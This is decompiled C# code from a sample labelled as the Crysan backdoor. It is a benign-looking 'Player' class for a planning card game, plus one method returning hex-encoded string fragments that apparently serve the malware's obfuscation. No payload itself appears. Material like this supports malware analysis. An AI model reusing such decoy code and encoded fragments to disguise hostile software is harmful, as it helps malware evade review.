// Decompiled with JetBrains decompiler
// Type: RiskManagement.Player
// Assembly: IRefle, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 09188B70-FC90-4B10-A900-838DE205A659
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\Backdoor.MSIL.Crysan.drn-7517431630373a1eec83586fad357154d832851724f8aa57ce6561d87ee8f8f1.exe

using SimpleJSON;

namespace RiskManagement
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
      string str = (string) null;
      switch (BaseStream)
      {
        case 0:
          str = "537472696E6750617273";
          break;
        case 1:
          str = "58764978445654";
          break;
      }
      return str;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex) => this.PlanningCards.Length == 0 ? 0 : this.PlanningCards[cardTypeIndex];

    public int PlanningCardsCount
    {
      get
      {
        int planningCardsCount = 0;
        foreach (int planningCard in this.PlanningCards)
        {
          if (planningCard > 0)
            ++planningCardsCount;
        }
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
      string str = " ";
      for (int index = 0; index < this.PlanningCards.Length; ++index)
      {
        int planningCard = this.PlanningCards[index];
        if (planningCard != 0)
          str = str + Card.CardTypeNames[index] + "x" + planningCard.ToString() + " ";
      }
      return str;
    }

    public static Player Deserialize(JSONNode json) => new Player()
    {
      Name = json["name"].Value,
      PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
      UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
    };

    private static int[] ParsePlanningCards(JSONNode json)
    {
      int count = json.Count;
      int[] planningCards = new int[count];
      for (int aIndex = 0; aIndex < count; ++aIndex)
        planningCards[aIndex] = json[aIndex].AsInt;
      return planningCards;
    }

    public override string ToString() => string.Format("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
  }
}
